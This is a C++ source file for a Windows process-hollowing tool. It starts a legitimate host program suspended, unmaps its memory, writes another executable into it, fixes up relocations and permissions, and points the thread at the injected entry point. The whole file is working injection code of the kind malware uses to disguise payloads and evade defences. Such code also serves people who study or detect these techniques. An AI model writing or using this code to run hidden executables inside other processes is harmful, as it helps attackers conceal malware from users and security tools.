#include "processHollower.h"

ProcessHollower::ProcessHollower() {
    dwGuestPEAddress = 0;
    pGuestPEHeaders = new PE_HEADERS;
    dwHostImageBaseAddress = 0;
    lpHostProcessInformation = new PROCESS_INFORMATION();
}

ProcessHollower::~ProcessHollower() {
    delete lpHostProcessInformation;
    lpHostProcessInformation = nullptr;
    delete pGuestPEHeaders;
    pGuestPEHeaders = nullptr;
}

BOOL ProcessHollower::execute(char *lpHostApplicationName, LPVOID lpGuestPEData) {
    GetGuestPEData(lpGuestPEData);
    if (!CreateHostProcess(lpHostApplicationName))
        return FALSE;
    if (!GetHostProcessBaseAddress()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!UnmapHostProcessMemory()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!AllocateProcessMemory()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!InjectGuestPE()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!JumpToEntryPoint()) {
        TerminateHostProcess();
        return FALSE;
    }
    return TRUE;
}

VOID ProcessHollower::GetGuestPEData(LPVOID lpBuffer) {
    dwGuestPEAddress = (VIRTUAL_ADDRESS) lpBuffer;
    pGuestPEHeaders = LoadPEHeaders((VIRTUAL_ADDRESS) lpBuffer);
}

BOOL ProcessHollower::CreateHostProcess(char *lpHostApplicationName) {
    auto lpStartupInfo = new STARTUPINFOA();
    return CreateProcess(lpHostApplicationName, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, lpStartupInfo, lpHostProcessInformation);
}

BOOL ProcessHollower::GetHostProcessBaseAddress() {
    PPEB pPEB = ReadRemotePEB(lpHostProcessInformation->hProcess);
    if (pPEB == nullptr)
        return  FALSE;
    dwHostImageBaseAddress = (VIRTUAL_ADDRESS)pPEB->ImageBaseAddress; // atencio! si no hi ha relocations caldra que agafem l'address del PE_HEADERS guest i sobreescrivim l'image base address del PEB!
    return TRUE;
}

BOOL ProcessHollower::UnmapHostProcessMemory() {
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    auto NtUnmapViewOfSection = (_NtUnmapViewOfSection) fpNtUnmapViewOfSection;
    DWORD dwStatus = NtUnmapViewOfSection(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress);
    return dwStatus == STATUS_SUCCESS;
}

BOOL ProcessHollower::AllocateProcessMemory() {
    // if there are no relocations, process should be inserted in injected PE BaseAddress, and later change PEB base address field before jumping to entry point
    LPVOID lpBaseAddress = VirtualAllocEx(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress, pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    return lpBaseAddress != nullptr;
}

BOOL ProcessHollower::InjectGuestPE() {
    //what happens if it's negative?
    VIRTUAL_ADDRESS dwRelocationDelta = dwHostImageBaseAddress - pGuestPEHeaders->NTHeaders->OptionalHeader.ImageBase;
    pGuestPEHeaders->NTHeaders->OptionalHeader.ImageBase = (VIRTUAL_ADDRESS)dwHostImageBaseAddress;
    if (!WriteProcessSection(dwHostImageBaseAddress, (LPCVOID) dwGuestPEAddress, pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfHeaders))
        return FALSE;

    for (DWORD i = 0; i < pGuestPEHeaders->NTHeaders->FileHeader.NumberOfSections; i++) {
        if (!pGuestPEHeaders->SectionHeaders[i].PointerToRawData)
            continue;
        VIRTUAL_ADDRESS pSectionDestination = dwHostImageBaseAddress + pGuestPEHeaders->SectionHeaders[i].VirtualAddress;
        if (!WriteProcessSection(pSectionDestination, (LPCVOID)(dwGuestPEAddress + pGuestPEHeaders->SectionHeaders[i].PointerToRawData), pGuestPEHeaders->SectionHeaders[i].SizeOfRawData))
            return FALSE;
    }
    if (!ApplyRelocations(dwRelocationDelta))
        return FALSE;
    SetSectionsPermissions();
    return TRUE;
}

BOOL ProcessHollower::WriteProcessSection(VIRTUAL_ADDRESS lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize) {
    SIZE_T lpNumberOfBytesWritten;
    BOOL bSuccess = WriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &lpNumberOfBytesWritten);
    return bSuccess && nSize == lpNumberOfBytesWritten;
}

DWORD ProcessHollower::findRelocationSection() {
    char SectionName[] = ".reloc";
    for (int i = 0; i < pGuestPEHeaders->NTHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pGuestPEHeaders->SectionHeaders[i].Name, &SectionName, strlen(SectionName)) == 0)
            return i;
    }
    return -1;
}

BOOL ProcessHollower::ApplyRelocations(VIRTUAL_ADDRESS dwRelocationDelta) {
    PBASE_RELOCATION_BLOCK pBlockHeader;
    PBASE_RELOCATION_ENTRY pBlocks;
    int dwRelocationSection = findRelocationSection();
    if (dwRelocationDelta == 0 || dwRelocationSection == -1) {
        return TRUE;
    }
    DWORD dwOffset = 0;
    IMAGE_DATA_DIRECTORY RelocationData = pGuestPEHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    VIRTUAL_ADDRESS dwRelocationAddress = pGuestPEHeaders->SectionHeaders[dwRelocationSection].PointerToRawData;
    while (dwOffset < RelocationData.Size) {
        pBlockHeader = (PBASE_RELOCATION_BLOCK) (dwGuestPEAddress + dwRelocationAddress + dwOffset);
        dwOffset += sizeof(BASE_RELOCATION_BLOCK);
        pBlocks = (PBASE_RELOCATION_ENTRY) (dwGuestPEAddress + dwRelocationAddress + dwOffset);
        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
        ApplyBlockRelocations(dwEntryCount, dwOffset, pBlocks, pBlockHeader, dwRelocationDelta);
    }
    return TRUE;
}

BOOL ProcessHollower::ApplyBlockRelocations(DWORD dwEntryCount, DWORD &dwOffset, PBASE_RELOCATION_ENTRY pBlocks, PBASE_RELOCATION_BLOCK pBlockHeader, VIRTUAL_ADDRESS dwRelocationDelta) {
    VIRTUAL_ADDRESS dwAddressToRelocate;
    VIRTUAL_ADDRESS dwAddressToRelocateValue = 0;
    for (DWORD entry = 0; entry < dwEntryCount; entry++) {
        if (pBlocks[entry].Type == 0) {
            dwOffset += sizeof(BASE_RELOCATION_ENTRY);
            continue;
        }
        dwAddressToRelocate = dwHostImageBaseAddress + pBlockHeader->PageAddress + pBlocks[entry].Offset;
        if (!ReadProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
            return FALSE;
        dwAddressToRelocateValue += dwRelocationDelta;
        if (!WriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
            return FALSE;
        dwOffset += sizeof(BASE_RELOCATION_ENTRY);
    }
    return TRUE;
}

BOOL ProcessHollower::SetSectionsPermissions() {
    DWORD dwFlOldProtect;
    DWORD dwMemProtectionFlag;
    if (!VirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) dwHostImageBaseAddress,  pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwFlOldProtect))
        return FALSE;
    for (DWORD i = 0; i < pGuestPEHeaders->NTHeaders->FileHeader.NumberOfSections; i++) {
        if (!pGuestPEHeaders->SectionHeaders[i].PointerToRawData)
            continue;
        dwMemProtectionFlag = GetMemProtectionFlag(pGuestPEHeaders->SectionHeaders[i].Characteristics);
        if (!VirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) (dwHostImageBaseAddress + pGuestPEHeaders->SectionHeaders[i].VirtualAddress),  pGuestPEHeaders->SectionHeaders[i].SizeOfRawData, dwMemProtectionFlag, &dwFlOldProtect))
            return  FALSE;
    }
    return TRUE;
}

VOID ProcessHollower::SetEntryPoint(PCONTEXT pContext, VIRTUAL_ADDRESS dwEntrypoint) {
    #ifdef _WIN64
        pContext->Rcx = dwEntrypoint;
    #else
        pContext->Eax = dwEntrypoint;
    #endif
}

BOOL ProcessHollower::JumpToEntryPoint() {
    auto pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(lpHostProcessInformation->hThread, pContext))
        return FALSE;
    VIRTUAL_ADDRESS dwEntrypoint = dwHostImageBaseAddress + pGuestPEHeaders->NTHeaders->OptionalHeader.AddressOfEntryPoint;
    SetEntryPoint(pContext, dwEntrypoint);
    SetThreadContext(lpHostProcessInformation->hThread, pContext);
    if (!ResumeThread(lpHostProcessInformation->hThread))
        return FALSE;
    return TRUE;
}

VOID ProcessHollower::TerminateHostProcess() {
    TerminateProcess(lpHostProcessInformation->hProcess, -1);
}